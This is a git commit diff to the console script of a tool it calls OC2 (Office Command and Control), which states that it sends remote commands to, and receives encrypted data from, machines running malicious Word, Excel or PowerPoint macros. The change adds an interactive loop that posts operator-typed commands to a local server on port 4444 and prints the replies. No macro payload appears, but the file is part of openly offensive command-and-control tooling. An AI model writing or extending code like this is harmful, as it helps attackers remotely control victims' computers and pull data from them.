08c9884a7243b48f5d828b23da239bbff79657e8
Splint <79016046+Splintaz@users.noreply.github.com>
2021-12-20 21:53:58 +0100

    request.py

--- extra/request.py
+++ extra/request.py
@@ -1,7 +1,11 @@
 # OC2 (Office Command and Control) allows you to send remote commands and receive encrypted data with a Word/Excel/PowerPoint Macro.
 # Created by https://github.com/Splintaz/
 import requests
-dictToSend = "Hello" # String to send
-res = requests.post("http://0.0.0.0:1234/python", json=dictToSend)
-dictFromServer = res.json() 
-print(f"Response from server: {dictFromServer}") # dictToReturn sends us the server string
+import colorama
+from colorama import Fore, Back, Style
+from flask import Blueprint, request, Response
+while True:
+    dictToSend = input(Fore.CYAN + "> ") # String to send
+    res = requests.post("http://0.0.0.0:4444/python", json=dictToSend)
+    dictFromServer = res.json() 
+    print(dictFromServer) # dictToReturn sends us the server string
